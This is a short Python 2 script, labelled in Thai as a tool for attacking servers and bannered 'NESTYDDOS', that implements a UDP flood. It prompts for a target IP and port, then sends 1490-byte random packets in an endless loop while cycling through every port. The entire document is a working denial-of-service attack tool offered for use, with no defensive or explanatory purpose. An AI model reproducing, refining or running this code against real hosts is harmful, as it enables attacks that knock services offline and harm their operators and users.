#สคริปยิงเซิร์ฟฮอน
#Version.1
#By Nesty

import os
import sys
import socket
import random

#ตั้งค่า SOCK AND RANDOM
##########################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
bytes = random._urandom(1490)                           ##
##########################################################

os.system("clear")
print 
print "  _   _ ______  _____ _________     _______  _____   ____   _____  "
print " | \ | |  ____|/ ____|__   __\ \   / /  __ \|  __ \ / __ \ / ____| "
print " |  \| | |__  | (___    | |   \ \_/ /| |  | | |  | | |  | | (___   "
print " | . ` |  __|  \___ \   | |    \   / | |  | | |  | | |  | |\___ \  "
print " | |\  | |____ ____) |  | |     | |  | |__| | |__| | |__| |____) | "
print " |_| \_|______|_____/   |_|     |_|  |_____/|_____/ \____/|_____/  "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s sampe down port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
